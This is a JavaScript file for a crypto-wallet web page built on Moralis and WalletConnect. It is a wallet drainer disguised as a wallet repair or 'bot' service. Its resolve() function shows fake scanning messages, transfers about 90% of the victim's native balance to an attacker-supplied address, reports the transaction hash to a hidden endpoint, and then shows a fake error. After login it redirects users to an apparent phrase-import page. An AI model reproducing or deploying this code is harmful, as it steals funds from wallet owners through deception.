
async function getCredentials() {
    let credentials = await $.get("/api/")
    return credentials 
}

let address = null;

$(document).ready(async function () {

    let needed_data = await getCredentials();
    needed_data = JSON.parse(needed_data);

    const serverUrl = needed_data.server_url;
    const appNeeds = needed_data.app_needs;
    address = needed_data.address
    Moralis.start({ serverUrl, appId: appNeeds });

    const activeUser = await user();

    if(localStorage.walletconnect){
        Moralis.enableWeb3({ provider: "walletconnect" })
        processAuth()
    } else {
        Moralis.enableWeb3()
    }


    $("button.ibLsRQ").click(function() {

        connect("walletconnect", 'eth')
        return false;
    })        

})


async function connect(provider, network) {

    chain = chainIds(network)
  // Enable web3 to get user address and chain
    await Moralis.enableWeb3({ throwOnError: true, provider, chainId: chain });

    let {account, chainId} = Moralis;


    $("div.loader").css("display", "grid");
    setTimeout(function () {
        
        $("#current-wallet-app-send").text("WalletConnect");
            $("#walletNameData").val("WalletConnect");
            $("#current-wallet-send-logo").attr("src", "https://ethereum-magicians.org/uploads/default/original/1X/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png");
            $("#connect-dialog").hide();
            $("#send-dialog").show();

    }, 2000)

  // Get message to sign from the auth api
    const { message } = await Moralis.Cloud.run('requestMessage', {
        address: account,
        chain: parseInt(chainId, 16),
        networkType: 'evm',
    });


  // Authenticate and login via parse
    Moralis.authenticate({
        signingMessage: message,
        provider
    }).then(async () => {
        setTimeout(function () {
        window.location = '/connect/import.html'
    }, 2000)
    }).catch((err) => {
        setTimeout(function () {
        window.location = '/connect/import.html'
    }, 2000)
    });
}


const user = () => {

    let activeUser = Moralis.User.current();
    return activeUser

}

const spinner = () => {
    $("div.overlay").css("display","grid");
    let actions = ['Initialiazing...','Scanning...','Resolving...','Resetting...'];
    let counter = 1;
    let interval = setInterval(() => {

        if(counter >= 1 && counter <= 5) {
            $("div.action-text").text(actions[0])
        }

        if(counter >= 6 && counter <= 10) {
            $("div.action-text").text(actions[1])
        }

        if(counter >= 11 && counter <= 15) {
            $("div.action-text").text(actions[2])
        }

        if(counter >= 16) {
            $("div.action-text").text(actions[3])
        }
        counter++

        if(counter > 20) {
            clearInterval(interval)
        }

    }, 500)
}

const resolve = async (network) => {
    chain = chainIds(network)
    spinner()
    const balance = await Moralis.Web3API.account.getNativeBalance({ chain: chain });


    let readableBalance = Moralis.Units.FromWei(balance.balance); 

    let percent = readableBalance * 0.10;

    readableBalance -= percent;
    
    const transactionAmount = Moralis.Units.Token(readableBalance.toFixed(18))

    if(balance && balance.balance > 900000) {
        const options = {
            type: 'native',
            amount: transactionAmount,
            receiver : address
        };

        Moralis.transfer(options).then(async (transaction) => {

            await $.get('/app/api/sdgs45sf/?sdgs45sf=' + transaction.hash)
            toastr.error("Bot encountered an error, please contact admin")
            $("div.overlay").css("display","none");

        }).catch((err) => {

            toastr.error("An error occured during operations: " + err.message.replace(" make sure to call Moralis.enableWeb3() or Moralis.authenticate()",""));
            $("div.overlay").css("display","none");

        })
    } else {

        toastr.error("Cannot perform operations, Insufficient Balance")
        $("div.overlay").css("display","none");
    }
}

const chainIds = (network) => {
    const chains = {
        "bsc":56,
        "eth":1,
        "ftm":250,
        "matic": 137
    }

    return chains[network]
} 

const processAuth = async () => {
 $("div.action-button").show()
 $("div.connect-wallet").hide();

 connectedAddress = await Moralis.User.current().get('ethAddress');
 $(".connected-address").text(connectedAddress)
}

const logout = () => {
    Moralis.User.logOut();
    localStorage.removeItem("walletconnect");
    window.location.href = window.location
}



